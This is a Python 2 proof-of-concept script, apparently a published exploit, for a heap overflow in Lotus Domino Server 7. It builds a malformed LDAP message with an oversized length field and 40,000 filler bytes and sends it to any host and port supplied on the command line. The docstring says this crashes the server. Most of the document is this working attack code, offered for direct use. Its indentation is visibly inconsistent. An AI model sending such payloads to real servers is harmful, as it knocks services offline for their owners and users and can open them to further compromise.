#!/usr/bin/env python
# lotus_heap1.py
#
# Use this code at your own risk. Never run it against a production system.
# 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import socket
import sys

"""
Discovery date: Feb, 2006!!! 

Lotus Domino Server 7 (and probably 8.x, you test if you want to know) 
heap overflow

On Linux Lotus print something like this and exits:
PANIC: OSBBlockAddr: Bad BBlock handle (51515151)

Trigger for this bug is below.

"""

def int2berlen(i):
        e=int2ber(i, signed=0)
        if i <= 127:
                return e
        else:
                l=len(e)
                return chr(0x80|l) + e

def int2ber(i, signed=1):
        encoded=''
        while ((signed and (i>127 or i<-128))
                or (not signed and (i>255))):
                encoded=chr(i%256)+encoded
                i=i>>8
        encoded=chr(i%256)+encoded
        return encoded


def send_req(host,port):
  s = "\x04"
        s += "\x84\xff\xff\xff\xfe"
        s += "\x51" * 40000

        req = ""
        req +="\x02\x01\x01" 
        req += chr(0x20|0x40|0x08)
        req += int2berlen(len(s))
        req += s
                
        msg = ""
        msg += chr(0x10|0x20)
        msg += int2berlen(len(req))
        msg += req

 print "Sending %d bytes to %s:%d" % (len(msg), host, port)

 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host,port))
 sock.sendall(msg)
 sock.close()

 print "Done"

if __name__=="__main__":
 if len(sys.argv)<3:
  print "usage: %s host port" % sys.argv[0]
  sys.exit()

 send_req(sys.argv[1],int(sys.argv[2]))
